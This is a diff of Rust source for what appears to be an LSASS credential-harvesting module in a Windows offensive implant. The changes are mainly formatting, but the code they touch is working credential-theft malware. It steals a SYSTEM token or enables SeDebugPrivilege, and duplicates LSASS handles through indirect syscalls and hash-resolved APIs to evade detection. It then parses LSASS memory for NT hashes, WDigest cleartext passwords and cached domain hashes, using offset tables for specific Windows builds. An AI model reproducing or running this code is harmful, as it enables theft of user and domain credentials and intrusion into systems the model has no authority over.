@@ -27,7 +27,7 @@
 use anyhow::{anyhow, Context, Result};
 use serde::Serialize;
 use std::ptr;
-use winapi::um::winnt::{HANDLE, PROCESS_VM_READ, PROCESS_QUERY_INFORMATION};
+use winapi::um::winnt::{HANDLE, PROCESS_QUERY_INFORMATION, PROCESS_VM_READ};
 
 use crate::nt_handle::NtHandle;
 
@@ -136,10 +136,7 @@ unsafe fn nt_query_system_information(
 /// When the `syscall-emulation` feature is compiled in and enabled, this
 /// routes through the kernel32 `OpenProcess` fallback.  Otherwise it
 /// uses the existing indirect syscall via `nt_syscall`.
-unsafe fn nt_open_process(
-    pid: u32,
-    desired_access: u32,
-) -> Result<HANDLE> {
+unsafe fn nt_open_process(pid: u32, desired_access: u32) -> Result<HANDLE> {
     use winapi::shared::ntdef::OBJECT_ATTRIBUTES;
 
     #[repr(C)]
@@ -230,10 +227,7 @@ unsafe fn nt_duplicate_object(
 /// When the `syscall-emulation` feature is compiled in and enabled, this
 /// routes through the kernel32 `VirtualQueryEx` fallback.  Otherwise it
 /// uses the existing indirect syscall via `nt_syscall`.
-unsafe fn nt_query_virtual_memory(
-    process: HANDLE,
-    base_address: usize,
-) -> Option<MemoryBasicInfo> {
+unsafe fn nt_query_virtual_memory(process: HANDLE, base_address: usize) -> Option<MemoryBasicInfo> {
     let mut mbi: MemoryBasicInfo = std::mem::zeroed();
 
     #[cfg(all(windows, feature = "syscall-emulation"))]
@@ -298,8 +292,14 @@ unsafe fn nt_read_virtual_memory(
         );
         match status {
             Ok(s) if nt_success(s) => Ok(bytes_read),
-            Ok(s) => Err(anyhow!("NtReadVirtualMemory({:#x}) failed: 0x{s:08X}", base_address)),
-            Err(e) => Err(anyhow!("NtReadVirtualMemory({:#x}) emulation error: {e}", base_address)),
+            Ok(s) => Err(anyhow!(
+                "NtReadVirtualMemory({:#x}) failed: 0x{s:08X}",
+                base_address
+            )),
+            Err(e) => Err(anyhow!(
+                "NtReadVirtualMemory({:#x}) emulation error: {e}",
+                base_address
+            )),
         }
     }
 
@@ -320,7 +320,10 @@ unsafe fn nt_read_virtual_memory(
         );
 
         if !nt_success(status) {
-            Err(anyhow!("NtReadVirtualMemory({:#x}) failed: 0x{status:08X}", base_address))
+            Err(anyhow!(
+                "NtReadVirtualMemory({:#x}) failed: 0x{status:08X}",
+                base_address
+            ))
         } else {
             Ok(bytes_read)
         }
@@ -455,21 +458,111 @@ struct MsvOffsets {
 /// 22621 (Win11 22H2), 22631 (Win11 23H2), 26100 (Win11 24H2).
 const MSV_OFFSET_TABLE: &[(u32, MsvOffsets)] = &[
     // Build 19041–19045: Windows 10 2004–22H2
-    (19041, MsvOffsets { primary_cred_offset: 0x10, nt_hash_offset: 0x18, sha1_hash_offset: 0x28, username_offset: 0x38, domain_offset: 0x48 }),
-    (19042, MsvOffsets { primary_cred_offset: 0x10, nt_hash_offset: 0x18, sha1_hash_offset: 0x28, username_offset: 0x38, domain_offset: 0x48 }),
-    (19043, MsvOffsets { primary_cred_offset: 0x10, nt_hash_offset: 0x18, sha1_hash_offset: 0x28, username_offset: 0x38, domain_offset: 0x48 }),
-    (19044, MsvOffsets { primary_cred_offset: 0x10, nt_hash_offset: 0x18, sha1_hash_offset: 0x28, username_offset: 0x38, domain_offset: 0x48 }),
-    (19045, MsvOffsets { primary_cred_offset: 0x10, nt_hash_offset: 0x18, sha1_hash_offset: 0x28, username_offset: 0x38, domain_offset: 0x48 }),
+    (
+        19041,
+        MsvOffsets {
+            primary_cred_offset: 0x10,
+            nt_hash_offset: 0x18,
+            sha1_hash_offset: 0x28,
+            username_offset: 0x38,
+            domain_offset: 0x48,
+        },
+    ),
+    (
+        19042,
+        MsvOffsets {
+            primary_cred_offset: 0x10,
+            nt_hash_offset: 0x18,
+            sha1_hash_offset: 0x28,
+            username_offset: 0x38,
+            domain_offset: 0x48,
+        },
+    ),
+    (
+        19043,
+        MsvOffsets {
+            primary_cred_offset: 0x10,
+            nt_hash_offset: 0x18,
+            sha1_hash_offset: 0x28,
+            username_offset: 0x38,
+            domain_offset: 0x48,
+        },
+    ),
+    (
+        19044,
+        MsvOffsets {
+            primary_cred_offset: 0x10,
+            nt_hash_offset: 0x18,
+            sha1_hash_offset: 0x28,
+            username_offset: 0x38,
+            domain_offset: 0x48,
+        },
+    ),
+    (
+        19045,
+        MsvOffsets {
+            primary_cred_offset: 0x10,
+            nt_hash_offset: 0x18,
+            sha1_hash_offset: 0x28,
+            username_offset: 0x38,
+            domain_offset: 0x48,
+        },
+    ),
     // Build 20348: Windows Server 2022
-    (20348, MsvOffsets { primary_cred_offset: 0x10, nt_hash_offset: 0x18, sha1_hash_offset: 0x28, username_offset: 0x38, domain_offset: 0x48 }),
+    (
+        20348,
+        MsvOffsets {
+            primary_cred_offset: 0x10,
+            nt_hash_offset: 0x18,
+            sha1_hash_offset: 0x28,
+            username_offset: 0x38,
+            domain_offset: 0x48,
+        },
+    ),
     // Build 22000: Windows 11 21H2
-    (22000, MsvOffsets { primary_cred_offset: 0x10, nt_hash_offset: 0x18, sha1_hash_offset: 0x28, username_offset: 0x40, domain_offset: 0x50 }),
+    (
+        22000,
+        MsvOffsets {
+            primary_cred_offset: 0x10,
+            nt_hash_offset: 0x18,
+            sha1_hash_offset: 0x28,
+            username_offset: 0x40,
+            domain_offset: 0x50,
+        },
+    ),
     // Build 22621: Windows 11 22H2
-    (22621, MsvOffsets { primary_cred_offset: 0x10, nt_hash_offset: 0x18, sha1_hash_offset: 0x28, username_offset: 0x40, domain_offset: 0x50 }),
+    (
+        22621,
+        MsvOffsets {
+            primary_cred_offset: 0x10,
+            nt_hash_offset: 0x18,
+            sha1_hash_offset: 0x28,
+            username_offset: 0x40,
+            domain_offset: 0x50,
+        },
+    ),
     // Build 22631: Windows 11 23H2
-    (22631, MsvOffsets { primary_cred_offset: 0x10, nt_hash_offset: 0x18, sha1_hash_offset: 0x28, username_offset: 0x40, domain_offset: 0x50 }),
+    (
+        22631,
+        MsvOffsets {
+            primary_cred_offset: 0x10,
+            nt_hash_offset: 0x18,
+            sha1_hash_offset: 0x28,
+            username_offset: 0x40,
+            domain_offset: 0x50,
+        },
+    ),
     // Build 26100: Windows 11 24H2
-    (26100, MsvOffsets { primary_cred_offset: 0x10, nt_hash_offset: 0x18, sha1_hash_offset: 0x28, username_offset: 0x40, domain_offset: 0x50 }),
+    (
+        26100,
+        MsvOffsets {
+            primary_cred_offset: 0x10,
+            nt_hash_offset: 0x18,
+            sha1_hash_offset: 0x28,
+            username_offset: 0x40,
+            domain_offset: 0x50,
+        },
+    ),
 ];
 
 /// WDigest structure offsets keyed by build.
@@ -484,28 +577,97 @@ struct WdigestOffsets {
 }
 
 const WDIGEST_OFFSET_TABLE: &[(u32, WdigestOffsets)] = &[
-    (19041, WdigestOffsets { password_offset: 0x30, username_offset: 0x20, domain_offset: 0x28 }),
-    (19042, WdigestOffsets { password_offset: 0x30, username_offset: 0x20, domain_offset: 0x28 }),
-    (19043, WdigestOffsets { password_offset: 0x30, username_offset: 0x20, domain_offset: 0x28 }),
-    (19044, WdigestOffsets { password_offset: 0x30, username_offset: 0x20, domain_offset: 0x28 }),
-    (19045, WdigestOffsets { password_offset: 0x30, username_offset: 0x20, domain_offset: 0x28 }),
-    (20348, WdigestOffsets { password_offset: 0x30, username_offset: 0x20, domain_offset: 0x28 }),
-    (22000, WdigestOffsets { password_offset: 0x38, username_offset: 0x28, domain_offset: 0x30 }),
-    (22621, WdigestOffsets { password_offset: 0x38, username_offset: 0x28, domain_offset: 0x30 }),
-    (22631, WdigestOffsets { password_offset: 0x38, username_offset: 0x28, domain_offset: 0x30 }),
-    (26100, WdigestOffsets { password_offset: 0x38, username_offset: 0x28, domain_offset: 0x30 }),
+    (
+        19041,
+        WdigestOffsets {
+            password_offset: 0x30,
+            username_offset: 0x20,
+            domain_offset: 0x28,
+        },
+    ),
+    (
+        19042,
+        WdigestOffsets {
+            password_offset: 0x30,
+            username_offset: 0x20,
+            domain_offset: 0x28,
+        },
+    ),
+    (
+        19043,
+        WdigestOffsets {
+            password_offset: 0x30,
+            username_offset: 0x20,
+            domain_offset: 0x28,
+        },
+    ),
+    (
+        19044,
+        WdigestOffsets {
+            password_offset: 0x30,
+            username_offset: 0x20,
+            domain_offset: 0x28,
+        },
+    ),
+    (
+        19045,
+        WdigestOffsets {
+            password_offset: 0x30,
+            username_offset: 0x20,
+            domain_offset: 0x28,
+        },
+    ),
+    (
+        20348,
+        WdigestOffsets {
+            password_offset: 0x30,
+            username_offset: 0x20,
+            domain_offset: 0x28,
+        },
+    ),
+    (
+        22000,
+        WdigestOffsets {
+            password_offset: 0x38,
+            username_offset: 0x28,
+            domain_offset: 0x30,
+        },
+    ),
+    (
+        22621,
+        WdigestOffsets {
+            password_offset: 0x38,
+            username_offset: 0x28,
+            domain_offset: 0x30,
+        },
+    ),
+    (
+        22631,
+        WdigestOffsets {
+            password_offset: 0x38,
+            username_offset: 0x28,
+            domain_offset: 0x30,
+        },
+    ),
+    (
+        26100,
+        WdigestOffsets {
+            password_offset: 0x38,
+            username_offset: 0x28,
+            domain_offset: 0x30,
+        },
+    ),
 ];
 
 /// Detect the Windows build number via RtlGetVersion.
 fn get_windows_build() -> u32 {
+    use winapi::shared::ntdef::NTSTATUS;
     use winapi::um::winnt::OSVERSIONINFOEXW;
-    use winapi::shared::ntdef::{NTSTATUS};
 
     // RtlGetVersion is exported by ntdll and always returns accurate version
     // information (it does not lie via compatibility shim).
-    let ntdll = unsafe {
-        pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL).unwrap_or(0)
-    };
+    let ntdll =
+        unsafe { pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_NTDLL_DLL).unwrap_or(0) };
     if ntdll == 0 {
         return 0;
     }
@@ -573,10 +735,7 @@ fn get_wdigest_offsets(build: u32) -> Option<WdigestOffsets> {
 
 /// Read a UTF-16 string from a remote process given a pointer to a UNICODE_STRING
 /// structure.  Returns an empty string on failure.
-unsafe fn read_remote_unicode_string(
-    process: HANDLE,
-    uni_str_addr: usize,
-) -> String {
+unsafe fn read_remote_unicode_string(process: HANDLE, uni_str_addr: usize) -> String {
     if uni_str_addr == 0 {
         return String::new();
     }
@@ -588,8 +747,14 @@ unsafe fn read_remote_unicode_string(
     }
     let length = u16::from_le_bytes([uni_header[0], uni_header[1]]) as usize;
     let buffer_ptr = usize::from_le_bytes([
-        uni_header[8], uni_header[9], uni_header[10], uni_header[11],
-        uni_header[12], uni_header[13], uni_header[14], uni_header[15],
+        uni_header[8],
+        uni_header[9],
+        uni_header[10],
+        uni_header[11],
+        uni_header[12],
+        uni_header[13],
+        uni_header[14],
+        uni_header[15],
     ]);
 
     if length == 0 || length > 4096 || buffer_ptr == 0 {
@@ -601,7 +766,9 @@ unsafe fn read_remote_unicode_string(
         return String::new();
     }
 
-    let utf16: Vec<u16> = buf.as_slice().chunks(2)
+    let utf16: Vec<u16> = buf
+        .as_slice()
+        .chunks(2)
         .map(|c| u16::from_le_bytes([c[0], c.get(1).copied().unwrap_or(0)]))
         .collect();
     String::from_utf16_lossy(&utf16)
@@ -706,8 +873,7 @@ fn prepare_privileges() -> Result<PrivilegeContext> {
         Err(_) => {
             // Fall back: steal a SYSTEM token.
             log::debug!("lsass_harvest: SeDebugPrivilege failed, attempting SYSTEM token theft");
-            crate::token_manipulation::get_system()
-                .context("failed to elevate to SYSTEM")?;
+            crate::token_manipulation::get_system().context("failed to elevate to SYSTEM")?;
             Ok(PrivilegeContext {
                 debug_priv_enabled_by_us: false,
                 stole_system_token: true,
@@ -723,11 +889,16 @@ fn prepare_privileges() -> Result<PrivilegeContext> {
 /// Uses indirect syscalls (NtOpenProcessToken, NtAdjustPrivilegesToken) and
 /// the static SeDebugPrivilege LUID instead of IAT imports.
 fn enable_debug_privilege() -> Result<bool> {
-    use winapi::um::winnt::{LUID_AND_ATTRIBUTES, TOKEN_ADJUST_PRIVILEGES, TOKEN_QUERY, TOKEN_PRIVILEGES};
+    use winapi::um::winnt::{
+        LUID_AND_ATTRIBUTES, TOKEN_ADJUST_PRIVILEGES, TOKEN_PRIVILEGES, TOKEN_QUERY,
+    };
 
     // SeDebugPrivilege LUID is always { LowPart: 20, HighPart: 0 } on all
     // Windows versions.  Using the static value avoids calling LookupPrivilegeValueW.
-    let debug_luid = winapi::um::winnt::LUID { LowPart: 20, HighPart: 0 };
+    let debug_luid = winapi::um::winnt::LUID {
+        LowPart: 20,
+        HighPart: 0,
+    };
 
     // ── NtOpenProcessToken via indirect syscall ──
     let current_process: HANDLE = (-1isize) as HANDLE; // GetCurrentProcess pseudo-handle
@@ -762,9 +933,9 @@ fn enable_debug_privilege() -> Result<bool> {
                 target.gadget_addr,
                 &[
                     token as u64,
-                    3u64,                           // TokenInformationClass = TokenPrivileges
-                    ptr::null_mut::<u8>() as u64,   // Buffer = NULL (length query)
-                    0u64,                           // BufferLength = 0
+                    3u64,                         // TokenInformationClass = TokenPrivileges
+                    ptr::null_mut::<u8>() as u64, // Buffer = NULL (length query)
+                    0u64,                         // BufferLength = 0
                     &mut return_length as *mut _ as u64,
                 ],
             )
@@ -772,7 +943,9 @@ fn enable_debug_privilege() -> Result<bool> {
         // STATUS_BUFFER_TOO_SMALL (0xC0000023) is expected when querying length.
         if !nt_success(status) && status as u32 != 0xC0000023 {
             nt_close(token);
-            return Err(anyhow!("NtQueryInformationToken length query failed: 0x{status:08X}"));
+            return Err(anyhow!(
+                "NtQueryInformationToken length query failed: 0x{status:08X}"
+            ));
         }
     }
     let was_enabled = if return_length > 0 {
@@ -785,9 +958,9 @@ fn enable_debug_privilege() -> Result<bool> {
                 target2.gadget_addr,
                 &[
                     token as u64,
-                    3u64,                           // TokenInformationClass = TokenPrivileges
-                    buf.as_mut_ptr() as u64,        // Buffer
-                    return_length as u64,           // BufferLength
+                    3u64,                    // TokenInformationClass = TokenPrivileges
+                    buf.as_mut_ptr() as u64, // Buffer
+                    return_length as u64,    // BufferLength
                     &mut return_length as *mut _ as u64,
                 ],
             )
@@ -796,13 +969,19 @@ fn enable_debug_privilege() -> Result<bool> {
             let tp = unsafe { std::ptr::read_unaligned(buf.as_ptr() as *const TOKEN_PRIVILEGES) };
             let mut privilege_count = tp.PrivilegeCount as usize;
             if privilege_count > 100 {
-                log::warn!("lsass_harvest: PrivilegeCount={} is suspiciously high, capping at 100", privilege_count);
+                log::warn!(
+                    "lsass_harvest: PrivilegeCount={} is suspiciously high, capping at 100",
+                    privilege_count
+                );
                 privilege_count = 100;
             }
             let entries = unsafe {
                 std::slice::from_raw_parts(
                     tp.Privileges.as_ptr(),
-                    privilege_count.min((return_length as usize - std::mem::size_of::<u32>()) / std::mem::size_of::<LUID_AND_ATTRIBUTES>()),
+                    privilege_count.min(
+                        (return_length as usize - std::mem::size_of::<u32>())
+                            / std::mem::size_of::<LUID_AND_ATTRIBUTES>(),
+                    ),
                 )
             };
             entries.iter().any(|p| {
@@ -837,11 +1016,11 @@ fn enable_debug_privilege() -> Result<bool> {
                 target.gadget_addr,
                 &[
                     token as u64,
-                    0u64,                                          // DisableAllPrivileges = FALSE
-                    &mut tp as *mut _ as u64,                      // NewState
-                    0u64,                                          // BufferLength
-                    ptr::null_mut::<u64>() as u64,                 // PreviousState
-                    ptr::null_mut::<u32>() as u64,                 // ReturnLength
+                    0u64,                          // DisableAllPrivileges = FALSE
+                    &mut tp as *mut _ as u64,      // NewState
+                    0u64,                          // BufferLength
+                    ptr::null_mut::<u64>() as u64, // PreviousState
+                    ptr::null_mut::<u32>() as u64, // ReturnLength
                 ],
             )
         };
@@ -861,7 +1040,10 @@ fn enable_debug_privilege() -> Result<bool> {
 fn disable_debug_privilege() -> Result<()> {
     use winapi::um::winnt::{TOKEN_ADJUST_PRIVILEGES, TOKEN_PRIVILEGES};
 
-    let debug_luid = winapi::um::winnt::LUID { LowPart: 20, HighPart: 0 };
+    let debug_luid = winapi::um::winnt::LUID {
+        LowPart: 20,
+        HighPart: 0,
+    };
 
     // Open current process token.
     let current_process: HANDLE = (-1isize) as HANDLE;
@@ -900,17 +1082,19 @@ fn disable_debug_privilege() -> Result<()> {
                 target.gadget_addr,
                 &[
                     token as u64,
-                    0u64,                                          // DisableAllPrivileges = FALSE
-                    &mut tp as *mut _ as u64,                      // NewState
-                    0u64,                                          // BufferLength
-                    ptr::null_mut::<u64>() as u64,                 // PreviousState
-                    ptr::null_mut::<u32>() as u64,                 // ReturnLength
+                    0u64,                          // DisableAllPrivileges = FALSE
+                    &mut tp as *mut _ as u64,      // NewState
+                    0u64,                          // BufferLength
+                    ptr::null_mut::<u64>() as u64, // PreviousState
+                    ptr::null_mut::<u32>() as u64, // ReturnLength
                 ],
             )
         };
         nt_close(token);
         if !nt_success(status) {
-            Err(anyhow!("NtAdjustPrivilegesToken(SE_PRIVILEGE_REMOVED) failed: 0x{status:08X}"))
+            Err(anyhow!(
+                "NtAdjustPrivilegesToken(SE_PRIVILEGE_REMOVED) failed: 0x{status:08X}"
+            ))
         } else {
             Ok(())
         }
@@ -1124,9 +1308,8 @@ fn duplicate_existing_lsass_handle(lsass_pid: u32) -> Result<HANDLE> {
 
     for i in 0..count {
         let entry_offset = entries_start + i * entry_size;
-        let entry = unsafe {
-            &*(buffer.as_ptr().add(entry_offset) as *const SystemHandleTableEntryInfo)
-        };
+        let entry =
+            unsafe { &*(buffer.as_ptr().add(entry_offset) as *const SystemHandleTableEntryInfo) };
 
         let owner_pid = entry.unique_process_id as u32;
         if owner_pid == our_pid || owner_pid == lsass_pid {
@@ -1144,9 +1327,7 @@ fn duplicate_existing_lsass_handle(lsass_pid: u32) -> Result<HANDLE> {
         }
 
         // Try to duplicate this handle from the owning process.
-        let source_handle = unsafe {
-            nt_open_process(owner_pid, PROCESS_DUP_HANDLE)
-        };
+        let source_handle = unsafe { nt_open_process(owner_pid, PROCESS_DUP_HANDLE) };
 
         let source = match source_handle {
             Ok(h) => h,
@@ -1172,8 +1353,12 @@ fn duplicate_existing_lsass_handle(lsass_pid: u32) -> Result<HANDLE> {
                 // Resolve GetProcessId at runtime to avoid IAT entry.
                 let get_pid: Option<unsafe extern "system" fn(winapi::um::winnt::HANDLE) -> u32> =
                     (|| unsafe {
-                        let k32 = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_KERNEL32_DLL)?;
-                        let addr = pe_resolve::get_proc_address_by_hash(k32, pe_resolve::hash_str(b"GetProcessId\0"))?;
+                        let k32 =
+                            pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_KERNEL32_DLL)?;
+                        let addr = pe_resolve::get_proc_address_by_hash(
+                            k32,
+                            pe_resolve::hash_str(b"GetProcessId\0"),
+                        )?;
                         Some(std::mem::transmute(addr))
                     })();
                 let ok = match get_pid {
@@ -1181,9 +1366,7 @@ fn duplicate_existing_lsass_handle(lsass_pid: u32) -> Result<HANDLE> {
                     None => continue,
                 };
                 if ok == lsass_pid {
-                    log::debug!(
-                        "lsass_harvest: duplicated LSASS handle from PID {owner_pid}"
-                    );
+                    log::debug!("lsass_harvest: duplicated LSASS handle from PID {owner_pid}");
                     return Ok(dup_handle);
                 }
                 nt_close(dup_handle);
@@ -1262,9 +1445,7 @@ fn parse_msv_credentials(
     let mut pos = 0;
     while pos + 0x80 < chunk.len() {
         // Look for "MSV" signature.
-        if chunk[pos] == msv_sig[0]
-            && chunk[pos + 1] == msv_sig[1]
-            && chunk[pos + 2] == msv_sig[2]
+        if chunk[pos] == msv_sig[0] && chunk[pos + 1] == msv_sig[1] && chunk[pos + 2] == msv_sig[2]
         {
             // Found MSV marker.  The structure is:
             //   KIWI_MSV1_0_CREDENTIAL {
@@ -1275,8 +1456,7 @@ fn parse_msv_credentials(
             // Follow the pointer to the primary credential.
             if pos + offsets.primary_cred_offset + 8 <= chunk.len() {
                 let primary_ptr = usize::from_le_bytes(
-                    chunk[pos + offsets.primary_cred_offset
-                        ..pos + offsets.primary_cred_offset + 8]
+                    chunk[pos + offsets.primary_cred_offset..pos + offsets.primary_cred_offset + 8]
                         .try_into()
                         .unwrap_or([0u8; 8]),
                 );
@@ -1284,13 +1464,13 @@ fn parse_msv_credentials(
                 if primary_ptr != 0 {
                     // Read the primary credential from LSASS.
                     let mut primary_buf = common::SecureBuffer::new(0x100);
-                    if let Ok(bytes_read) =
-                        unsafe { nt_read_virtual_memory(process, primary_ptr, primary_buf.as_mut_slice()) }
-                    {
+                    if let Ok(bytes_read) = unsafe {
+                        nt_read_virtual_memory(process, primary_ptr, primary_buf.as_mut_slice())
+                    } {
                         if bytes_read >= offsets.nt_hash_offset + 16 {
                             // Extract NT hash (16 bytes).
-                            let nt_hash = &primary_buf
-                                [offsets.nt_hash_offset..offsets.nt_hash_offset + 16];
+                            let nt_hash =
+                                &primary_buf[offsets.nt_hash_offset..offsets.nt_hash_offset + 16];
                             let all_zero = nt_hash.iter().all(|&b| b == 0);
                             if !all_zero {
                                 let hash_hex = hex::encode(nt_hash);
@@ -1298,28 +1478,24 @@ fn parse_msv_credentials(
                                 // Try to read username and domain.
                                 let username = if offsets.username_offset + 16 <= bytes_read {
                                     let uni_ptr = usize::from_le_bytes(
-                                        primary_buf[offsets.username_offset
-                                            ..offsets.username_offset + 8]
+                                        primary_buf
+                                            [offsets.username_offset..offsets.username_offset + 8]
                                             .try_into()
                                             .unwrap_or([0u8; 8]),
                                     );
-                                    unsafe {
-                                        read_remote_unicode_string(process, uni_ptr)
-                                    }
+                                    unsafe { read_remote_unicode_string(process, uni_ptr) }
                                 } else {
                                     String::new()
                                 };
 
                                 let domain = if offsets.domain_offset + 16 <= bytes_read {
                                     let uni_ptr = usize::from_le_bytes(
-                                        primary_buf[offsets.domain_offset
-                                            ..offsets.domain_offset + 8]
+                                        primary_buf
+                                            [offsets.domain_offset..offsets.domain_offset + 8]
                                             .try_into()
                                             .unwrap_or([0u8; 8]),
                                     );
-                                    unsafe {
-                                        read_remote_unicode_string(process, uni_ptr)
-                                    }
+                                    unsafe { read_remote_unicode_string(process, uni_ptr) }
                                 } else {
                                     String::new()
                                 };
@@ -1386,22 +1562,19 @@ fn parse_wdigest_credentials(
     // user-space pointers (pointing into LSASS range) and UsageCount is small.
     let mut pos = 0;
     while pos + 0x60 < chunk.len() {
-        let flink = usize::from_le_bytes(
-            chunk[pos..pos + 8].try_into().unwrap_or([0u8; 8]),
-        );
-        let blink = usize::from_le_bytes(
-            chunk[pos + 8..pos + 16].try_into().unwrap_or([0u8; 8]),
-        );
+        let flink = usize::from_le_bytes(chunk[pos..pos + 8].try_into().unwrap_or([0u8; 8]));
+        let blink = usize::from_le_bytes(chunk[pos + 8..pos + 16].try_into().unwrap_or([0u8; 8]));
 
         // Check if Flink and Blink look like valid user-space pointers.
-        let valid_ptrs = flink > 0x1_0000 && flink < HIGHEST_USER_ADDRESS
-            && blink > 0x1_0000 && blink < HIGHEST_USER_ADDRESS;
+        let valid_ptrs = flink > 0x1_0000
+            && flink < HIGHEST_USER_ADDRESS
+            && blink > 0x1_0000
+            && blink < HIGHEST_USER_ADDRESS;
 
         if valid_ptrs {
             // Check UsageCount at offset +0x10.
-            let usage_count = u32::from_le_bytes(
-                chunk[pos + 16..pos + 20].try_into().unwrap_or([0u8; 4]),
-            );
+            let usage_count =
+                u32::from_le_bytes(chunk[pos + 16..pos + 20].try_into().unwrap_or([0u8; 4]));
 
             if usage_count <= 10 {
                 // Attempt to read the username, domain, and password fields.
@@ -1544,9 +1717,7 @@ fn parse_dcc2_hashes(
     let mut pos = 0;
     while pos + 48 < chunk.len() {
         // Check for revision field (1 = DCC1, 2 = DCC2).
-        let revision = u32::from_le_bytes(
-            chunk[pos..pos + 4].try_into().unwrap_or([0u8; 4]),
-        );
+        let revision = u32::from_le_bytes(chunk[pos..pos + 4].try_into().unwrap_or([0u8; 4]));
         if revision == 1 || revision == 2 {
             let hash_len = if revision == 2 { 32 } else { 16 };
             if pos + 4 + hash_len <= chunk.len() {
@@ -1611,14 +1782,12 @@ pub fn harvest_lsass() -> Result<String> {
     let debug_priv_was_enabled = priv_ctx.debug_priv_enabled_by_us;
 
     // 2. Locate LSASS.
-    let lsass_pid = find_lsass_pid()
-        .context("failed to locate lsass.exe")?;
+    let lsass_pid = find_lsass_pid().context("failed to locate lsass.exe")?;
 
     log::debug!("lsass_harvest: found LSASS at PID {lsass_pid}");
 
     // 3. Acquire handle.
-    let lsass_handle = acquire_lsass_handle(lsass_pid)
-        .context("failed to acquire LSASS handle")?;
+    let lsass_handle = acquire_lsass_handle(lsass_pid).context("failed to acquire LSASS handle")?;
 
     // Ensure handle is closed on all exit paths.
     // P3-17: NtHandle RAII wrapper from nt_handle.rs calls NtClose via
@@ -1634,7 +1803,10 @@ pub fn harvest_lsass() -> Result<String> {
     let wdigest_offsets = get_wdigest_offsets(build);
 
     if build > 0 {
-        log::debug!("lsass_harvest: Windows build {build}, MSV offsets: {:?}", msv_offsets);
+        log::debug!(
+            "lsass_harvest: Windows build {build}, MSV offsets: {:?}",
+            msv_offsets
+        );
     } else {
         log::warn!("lsass_harvest: could not detect Windows build, using dynamic matching");
     }
@@ -1685,7 +1857,7 @@ pub fn harvest_lsass() -> Result<String> {
             let li_bytes = i64::to_ne_bytes(li);
             let _ = crate::syscall!(
                 "NtDelayExecution",
-                0u64,           // Alertable = FALSE
+                0u64, // Alertable = FALSE
                 li_bytes.as_ptr() as u64,
             );
         }
